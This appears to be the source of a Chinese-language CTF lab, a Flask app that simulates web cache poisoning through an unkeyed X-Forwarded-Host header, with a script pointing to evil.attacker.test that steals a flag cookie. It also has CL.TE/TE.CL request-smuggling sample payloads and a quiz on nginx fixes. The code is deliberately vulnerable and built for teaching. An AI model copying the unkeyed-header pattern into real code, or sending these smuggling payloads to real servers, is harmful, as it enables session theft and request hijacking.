#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
adv3 — Web 缓存投毒 + 请求走私（简化可交互演示）

两部分：
A) 缓存投毒实验室（完整可复现的攻击链）：
   /home 页面的"统计脚本"域名取自 X-Forwarded-Host 头（未校验、未计入缓存键），
   攻击者请求一次 /home 带上 X-Forwarded-Host: evil.attacker.test 即可污染缓存；
   之后受害者访问 /home 会加载攻击者域上的 payload.js → 偷走 Cookie（flag 在里面）。
B) 请求走私演示（CL.TE 前后端视角对比）：
   提供真实的前端(Content-Length)/后端(Transfer-Encoding) 切分解析器，
   直观展示同一字节流的两种读法如何"失步"。

通关拿 flag 的两条路：
  1) 完整走完缓存投毒链（投毒 → 受害者访问 → 攻击者日志）；
  2) 在"修复挑战"里选对正确的 Nginx/应用配置（flag 就放在正确配置里）。
"""
import html
import json
import os
import threading

from flask import Flask, jsonify, request

BASE = os.path.dirname(os.path.abspath(__file__))
FLAG = os.environ.get("FLAG") or open(
    os.path.join(BASE, "flag.txt"), encoding="utf-8"
).read().strip()

app = Flask(__name__)

LOCK = threading.Lock()
CACHE = {}          # path -> body（缓存键只有 path —— 这正是漏洞）
EVIL_HOSTS = {}     # host -> action
ATTACKER_LOG = []
VICTIM_COOKIE = "session=9f8e7d31c4; remember=1; secret=" + FLAG
DEFAULT_ANALYTICS = "static.analytics-cdn.test"


def render_home(xfh=None):
    host = xfh if xfh else DEFAULT_ANALYTICS
    return """<!DOCTYPE html><html><head><meta charset="utf-8"><title>首页 - 受害站点</title></head>
<body style="font-family:sans-serif">
<h1>欢迎使用我们的站点</h1><p>今日天气：晴。今日特价：无。</p>
<!-- 运营要求支持"自定义域名"，统计脚本域名取自 X-Forwarded-Host -->
<script src="http://%s/analytics/payload.js"></script>
</body></html>""" % host


@app.route("/home")
def home():
    xfh = request.headers.get("X-Forwarded-Host")
    body = render_home(xfh)
    with LOCK:
        CACHE["/home"] = body   # 缓存键 = path（X-Forwarded-Host 未入键）
    return body


# ---------------- 缓存投毒攻击链 ----------------
@app.route("/api/poison", methods=["POST"])
def poison():
    data = request.get_json(silent=True) or {}
    host = str(data.get("host") or "evil.attacker.test").strip()
    if not host or len(host) > 100 or "/" in host:
        return jsonify({"ok": False, "msg": "host 参数非法"}), 400
    body = render_home(host)
    with LOCK:
        CACHE["/home"] = body
        EVIL_HOSTS[host] = "steal_cookies"
        ATTACKER_LOG.append({"type": "poison", "detail": "缓存 /home 已被污染，script 指向 %r" % host})
    return jsonify({"ok": True, "msg": "已用 X-Forwarded-Host: %s 请求 /home，缓存被污染" % host,
                    "poisoned_body": body})


@app.route("/api/visit", methods=["POST"])
def visit():
    with LOCK:
        body = CACHE.get("/home")
        log_len = len(ATTACKER_LOG)
    if body is None:
        return jsonify({"ok": False, "msg": "缓存为空，先访问 /home 或先投毒"}), 400
    import re
    m = re.search(r'src="http://([^/]+)/analytics/payload.js"', body)
    loaded = None
    with LOCK:
        if m and m.group(1) in EVIL_HOSTS:
            loaded = m.group(1)
            ATTACKER_LOG.append({"type": "victim_exec", "detail":
                                 "受害者加载了 http://%s/analytics/payload.js 并执行" % loaded})
            ATTACKER_LOG.append({"type": "stolen_cookie", "detail":
                                 "payload 执行 document.cookie → 回传：",
                                 "data": VICTIM_COOKIE})
    out = {"ok": True, "victim_saw": body, "script_host": m.group(1) if m else None,
           "executed_evil": loaded is not None}
    with LOCK:
        out["new_log"] = ATTACKER_LOG[log_len:]
    return jsonify(out)


@app.route("/api/log")
def get_log():
    with LOCK:
        return jsonify({"log": ATTACKER_LOG})


@app.route("/api/reset", methods=["POST"])
def reset():
    with LOCK:
        CACHE.clear()
        EVIL_HOSTS.clear()
        ATTACKER_LOG.clear()
    return jsonify({"ok": True, "msg": "缓存与日志已清空"})


# ---------------- 请求走私解析器（真实切分逻辑） ----------------
@app.route("/api/smuggle", methods=["POST"])
def smuggle():
    raw = (request.get_json(silent=True) or {}).get("raw", "")
    raw = raw.replace("\n", "\r\n").replace("\r\r", "\r")
    head_end = raw.find("\r\n\r\n")
    if head_end < 0:
        return jsonify({"ok": False, "msg": "缺少空行（\\r\\n\\r\\n）分隔头与体"}), 400
    head, body_start = raw[:head_end], head_end + 4
    headers = {}
    for line in head.split("\r\n")[1:]:
        if ":" in line:
            k, v = line.split(":", 1)
            headers[k.strip().lower()] = v.strip()
    cl = headers.get("content-length")
    te = headers.get("transfer-encoding", "").lower()

    def req(b):
        return b if len(b) < 400 else b[:400] + " …(截断)"

    fe_view = be_view = None
    if cl and cl.isdigit():
        end = body_start + int(cl)
        fe_body, fe_left = raw[body_start:end], raw[end:]
        fe_view = {
            "说明": "前端按 Content-Length=%s 切分" % cl,
            "第一个请求(头)": head, "第一个请求(体)": repr(fe_body),
            "剩余字节成为下一个请求": repr(fe_left) or "''",
        }
    if "chunked" in te:
        i, chunks = body_start, []
        while True:
            j = raw.find("\r\n", i)
            if j < 0:
                be_view = {"说明": "分块长度行不完整（流被挂起）——后端会继续等待"}
                break
            size_txt = raw[i:j].strip()
            try:
                size = int(size_txt, 16)
            except ValueError:
                be_view = {"说明": "分块长度非法：%r" % size_txt}
                break
            if size == 0:
                be_view = {
                    "说明": "后端按 Transfer-Encoding: chunked 切分（0 块即结束）",
                    "分块": chunks, "第一个请求(体)": repr(raw[body_start:j + 4]),
                    "剩余字节成为下一个请求": repr(raw[j + 4:]),
                }
                break
            chunks.append(raw[j + 2:j + 2 + size])
            i = j + 2 + size + 2
    if not fe_view and not be_view:
        return jsonify({"ok": False, "msg": "请求里没有 Content-Length 或 Transfer-Encoding: chunked"}), 400
    desync = bool(fe_view and be_view and fe_view.get("剩余字节成为下一个请求") != be_view.get("剩余字节成为下一个请求"))
    return jsonify({"ok": True, "front_end": fe_view, "back_end": be_view,
                    "desync": desync,
                    "结论": "前后端对剩余字节的归属不一致 → 走私成立（desync）" if desync
                            else "两种切分结果一致（或只解析出一种视角）"})


CL_TE_SAMPLE = (
    "POST / HTTP/1.1\r\n"
    "Host: target.local\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 6\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "0\r\n"
    "\r\n"
    "GPOST / HTTP/1.1\r\n"
    "Host: target.local\r\n"
    "Content-Length: 4\r\n"
    "\r\n"
    "x=1"
)

_TE_CL_INNER = (
    "GPOST / HTTP/1.1\r\n"
    "Host: target.local\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 4\r\n"
    "\r\n"
)
TE_CL_SAMPLE = (
    "POST / HTTP/1.1\r\n"
    "Host: target.local\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 4\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "%x\r\n" % len(_TE_CL_INNER)
) + _TE_CL_INNER + "0\r\n\r\n" + "x=1"


# ---------------- 修复挑战（正确配置里藏着 flag） ----------------
QUIZ = {
    "A": {"text": "把缓存 TTL 从 10 分钟调到 10 秒，污染自然过期。",
          "why": "只是缩小窗口，投毒随时可以重放。"},
    "B": {"text": "应用不再直接信任 X-Forwarded-Host 拼接资源 URL，改用固定配置域名；"
                  "同时缓存键 proxy_cache_key 加入 $http_x_forwarded_host/$host，未命中白名单回退默认域。",
          "why": None, "correct": True},
    "C": {"text": "全站升级到 HTTPS 并开启 HSTS。",
          "why": "加密传输与 Host 头信任、缓存键设计无关。"},
    "D": {"text": "在 WAF 上屏蔽包含 X-Forwarded-Host 的请求。",
          "why": "会误伤合法代理链（CDN/内网负载均衡都需要它），且黑名单可被头名变形绕过。"},
}


@app.route("/api/quiz", methods=["POST"])
def quiz():
    choice = str((request.get_json(silent=True) or {}).get("choice", "")).upper()
    item = QUIZ.get(choice)
    if not item:
        return jsonify({"ok": False, "msg": "选项应为 A/B/C/D"}), 400
    if item.get("correct"):
        return jsonify({"ok": True, "correct": True,
                        "msg": "正确！正确的配置如下（flag 就在这里）",
                        "config": "# nginx 关键修复\n"
                                  "proxy_cache_key $scheme$proxy_host$request_uri$http_x_forwarded_host;\n"
                                  "# 应用侧：X-Forwarded-Host 必须过白名单，未命中回退默认域\n"
                                  "# if ($http_x_forwarded_host !~* ^(static\\.analytics-cdn\\.test)$) {\n"
                                  "#     proxy_hide_header X-Forwarded-Host;\n"
                                  "# }\n\n# —— 答对了，拿走 flag ——\n" + FLAG})
    return jsonify({"ok": True, "correct": False,
                    "msg": "不正确：%s" % item["why"]})


# ---------------- 教学页面 ----------------
def esc(s):
    return html.escape(str(s), quote=True)


PAGE = """<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>adv3 · 缓存投毒与请求走私</title>
<style>
  :root { color-scheme: dark; }
  * { box-sizing: border-box; }
  body { margin:0; font-family:"Segoe UI","Microsoft YaHei",sans-serif; background:#0d1117; color:#e6edf3; line-height:1.65; }
  .wrap { max-width: 960px; margin: 0 auto; padding: 24px 20px 70px; }
  header { border-bottom:1px solid #30363d; padding-bottom:14px; margin-bottom:20px; }
  .cat { color:#58a6ff; font-size:14px; letter-spacing:1px; }
  h1 { font-size:26px; margin:6px 0 10px; }
  .badges { display:flex; gap:8px; align-items:center; flex-wrap:wrap; }
  .badge { font-size:12px; padding:2px 10px; border-radius:10px; border:1px solid currentColor; }
  h2 { font-size:17px; margin:30px 0 10px; color:#58a6ff; border-left:3px solid #58a6ff; padding-left:10px; }
  h3 { font-size:15px; margin:16px 0 8px; color:#79c0ff; }
  .desc { color:#c9d1d9; } .desc code, .lab code, .hint-body code { background:#0a0d12; border:1px solid #30363d; border-radius:4px; padding:0 5px; color:#79c0ff; }
  .lab { background:#161b22; border:1px solid #30363d; border-radius:8px; padding:16px; margin-bottom:16px; }
  .chips { display:flex; flex-wrap:wrap; gap:8px; }
  .chip { background:#161b22; border:1px solid #30363d; border-radius:14px; padding:2px 12px; font-size:13px; color:#79c0ff; }
  details.hint { background:#161b22; border:1px solid #30363d; border-radius:8px; padding:10px 14px; margin:8px 0; }
  details.hint summary { cursor:pointer; color:#d29922; }
  .hint-body { color:#c9d1d9; margin-top:6px; }
  .srcbox { background:#0a0d12; border:1px solid #30363d; border-radius:8px; padding:12px 14px; overflow:auto; }
  .srcbox pre { margin:0; } .srcbox code { font-family:Consolas,monospace; font-size:13px; }
  input[type=text] { background:#0d1117; color:#e6edf3; border:1px solid #30363d; border-radius:6px; padding:8px 10px; font-family:Consolas,monospace; width:100%; }
  textarea { background:#0d1117; color:#e6edf3; border:1px solid #30363d; border-radius:6px; padding:8px 10px; font-family:Consolas,monospace; width:100%; min-height:200px; }
  button { background:#1f6feb; border:none; color:#fff; border-radius:6px; padding:8px 18px; cursor:pointer; font-size:14px; margin-top:8px; }
  button.ghost { background:#30363d; }
  button.green { background:#238636; }
  pre.out { background:#0a0d12; border:1px dashed #30363d; border-radius:6px; padding:10px; overflow:auto; font-size:13px; white-space:pre-wrap; }
  form.flagform { display:flex; gap:10px; margin-top:10px; flex-wrap:wrap; }
  form.flagform input[type=text] { flex:1; min-width:240px; }
  .step { display:flex; gap:10px; align-items:center; flex-wrap:wrap; margin:6px 0; }
  .stepnum { background:#1f6feb; color:#fff; border-radius:50%; width:26px; height:26px; display:flex; align-items:center; justify-content:center; font-size:14px; flex:none; }
  table.cmp { border-collapse:collapse; width:100%; font-size:13px; }
  table.cmp td, table.cmp th { border:1px solid #30363d; padding:6px 10px; vertical-align:top; }
  table.cmp th { background:#161b22; color:#79c0ff; }
  .quizopt { display:block; margin:6px 0; cursor:pointer; }
  .nav { display:flex; justify-content:space-between; margin-top:40px; border-top:1px solid #30363d; padding-top:14px; font-size:14px; }
  .nav a { color:#58a6ff; text-decoration:none; }
</style></head><body><div class="wrap">
<header>
  <div class="cat">CTF Web 教学靶场 · 进阶攻击面 · adv3</div>
  <h1>让缓存替你说谎 —— 缓存投毒 & 请求走私</h1>
  <div class="badges">
    <span class="badge" style="color:#f85149">难度：高阶</span>
    <span class="badge" style="color:#79c0ff">进阶攻击面</span>
  </div>
</header>

<h2>📖 题目描述</h2>
<div class="desc">
受害站点 <code>/home</code> 的统计脚本域名取自 <code>X-Forwarded-Host</code> 请求头，
而 CDN 缓存键<b>只含路径</b>（"未入键"头 = 缓存投毒的经典温床）。
攻击者只需带恶意头请求一次 <code>/home</code>，之后<b>所有人</b>都会拿到被污染的页面、
执行攻击者域上的 JS。完整走通：① 投毒 → ② 受害者访问 → ③ 攻击者日志里偷到的 Cookie（含 flag）。
第二条拿 flag 的路：在"修复挑战"里选对正确的 Nginx 配置——<b>flag 就放在正确配置里</b>。
</div>

<h2>🧪 实验一 · 缓存投毒攻击链</h2>
<div class="lab">
  <div class="step"><span class="stepnum">1</span>
    <input type="text" id="evilhost" value="evil.attacker.test" style="max-width:280px">
    <button onclick="doPoison()">污染缓存（携带 X-Forwarded-Host）</button>
  </div>
  <div class="step"><span class="stepnum">2</span>
    <button class="green" onclick="doVisit()">受害者访问 /home</button>
    <span style="color:#8b949e;font-size:13px;">（模拟已登录用户，Cookie 里有秘密）</span>
  </div>
  <div class="step"><span class="stepnum">3</span>
    <button class="ghost" onclick="doLog()">查看攻击者日志</button>
    <button class="ghost" onclick="doReset()">重置环境</button>
    <a href="/home" target="_blank" style="color:#58a6ff">直接看当前缓存的 /home ↗</a>
  </div>
  <pre class="out" id="out1">等待操作……</pre>
</div>

<h2>🧪 实验二 · 请求走私（CL.TE / TE.CL）</h2>
<div class="desc" style="margin-bottom:8px;">
前后端对同一字节流按不同头（Content-Length vs Transfer-Encoding: chunked）切分，
对"剩余字节属于下一个请求"判断不一致，即 desync——走私的请求会"插队"污染连接，
常与缓存投毒组合：走私的响应直接写进缓存。
</div>
<div class="lab">
  <button class="ghost" onclick="setSmuggle(0)">载入 CL.TE 样例</button>
  <button class="ghost" onclick="setSmuggle(1)">载入 TE.CL 样例</button>
  <textarea id="smug"></textarea>
  <button onclick="doSmuggle()">解析两种视角</button>
  <pre class="out" id="out2">解析结果会展示前端/后端各自看到的请求边界……</pre>
</div>

<h2>🛠 修复挑战（选对正确的配置也能拿 flag）</h2>
<div class="lab" id="quizlab">
  <label class="quizopt"><input type="radio" name="q" value="A"> A. __QUIZ_A__</label>
  <label class="quizopt"><input type="radio" name="q" value="B"> B. __QUIZ_B__</label>
  <label class="quizopt"><input type="radio" name="q" value="C"> C. __QUIZ_C__</label>
  <label class="quizopt"><input type="radio" name="q" value="D"> D. __QUIZ_D__</label>
  <button onclick="doQuiz()">提交选择</button>
  <pre class="out" id="out3">flag 藏在正确配置里……</pre>
</div>

<h2>🎓 知识点</h2>
<div class="chips">
  <span class="chip">Web 缓存投毒</span><span class="chip">未入键头 X-Forwarded-Host</span>
  <span class="chip">CL.TE / TE.CL 请求走私</span><span class="chip">proxy_cache_key 修复</span>
</div>

<h2>💡 渐进提示（按顺序展开）</h2>
<details class="hint"><summary>💡 提示 1</summary><div class="hint-body">缓存键只有路径：同一个 /home，不同 X-Forwarded-Host 会互相覆盖。</div></details>
<details class="hint"><summary>💡 提示 2</summary><div class="hint-body">依次点 1→2→3：投毒后受害者加载 evil 域脚本，脚本偷走 document.cookie。</div></details>
<details class="hint"><summary>💡 提示 3</summary><div class="hint-body">curl 等价操作：POST /api/poison {"host":"evil.attacker.test"} → POST /api/visit → GET /api/log。</div></details>

<h2>🚩 提交 Flag</h2>
<form class="flagform" method="post" action="/api/verify">
  <input type="hidden" name="challenge_id" value="adv3">
  <input type="text" name="flag" placeholder="flag{adv3_xxxxxxxx}" required>
  <button type="submit">提交 Flag</button>
</form>

<div class="nav"><a href="/adv2">← 上一关：WebSocket 的门禁</a><span>通关愉快 🎉</span></div>
</div>
<script>
const OUT1 = document.getElementById('out1');
async function show(el, p){ const r = await p; el.textContent = JSON.stringify(r, null, 2); return r; }
function doPoison(){ show(OUT1, fetch('/api/poison', {method:'POST', headers:{'Content-Type':'application/json'},
  body: JSON.stringify({host: document.getElementById('evilhost').value})}).then(r=>r.json())); }
function doVisit(){ show(OUT1, fetch('/api/visit', {method:'POST'}).then(r=>r.json())); }
function doLog(){ show(OUT1, fetch('/api/log').then(r=>r.json())); }
function doReset(){ show(OUT1, fetch('/api/reset', {method:'POST'}).then(r=>r.json())); }
const SAMPLES = [__SMUG1__, __SMUG2__];
const ta = document.getElementById('smug');
function setSmuggle(i){ ta.value = SAMPLES[i]; }
setSmuggle(0);
function doSmuggle(){
  fetch('/api/smuggle', {method:'POST', headers:{'Content-Type':'application/json'},
    body: JSON.stringify({raw: ta.value})}).then(r=>r.json()).then(j => {
    const el = document.getElementById('out2');
    if (!j.ok){ el.textContent = j.msg || JSON.stringify(j); return; }
    el.textContent =
      '【前端视角 · ' + (j.front_end ? j.front_end['说明'] : '按 Content-Length') + '】\\n' +
      JSON.stringify(j.front_end, null, 2) + '\\n\\n【后端视角 · ' + (j.back_end ? j.back_end['说明'] : '按 chunked') + '】\\n' +
      JSON.stringify(j.back_end, null, 2) + '\\n\\n' + (j.desync ? '⚠ ' : '✔ ') + j['结论'];
  });
}
function doQuiz(){
  const v = document.querySelector('input[name=q]:checked');
  if (!v){ document.getElementById('out3').textContent = '先选一个选项'; return; }
  fetch('/api/quiz', {method:'POST', headers:{'Content-Type':'application/json'},
    body: JSON.stringify({choice: v.value})}).then(r=>r.json()).then(j => {
    document.getElementById('out3').textContent =
      (j.correct ? '✅ ' : '❌ ') + (j.msg || '') + '\\n\\n' + (j.config || '');
  });
}
</script>
</body></html>"""


@app.route("/")
def index():
    smug1 = json.dumps(CL_TE_SAMPLE.replace("\r\n", "\\r\\n"))
    smug2 = json.dumps(TE_CL_SAMPLE.replace("\r\n", "\\r\\n"))
    page = (PAGE
            .replace("__QUIZ_A__", esc(QUIZ["A"]["text"]))
            .replace("__QUIZ_B__", esc(QUIZ["B"]["text"]))
            .replace("__QUIZ_C__", esc(QUIZ["C"]["text"]))
            .replace("__QUIZ_D__", esc(QUIZ["D"]["text"]))
            .replace("__SMUG1__", smug1)
            .replace("__SMUG2__", smug2))
    return page


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8316, debug=False)
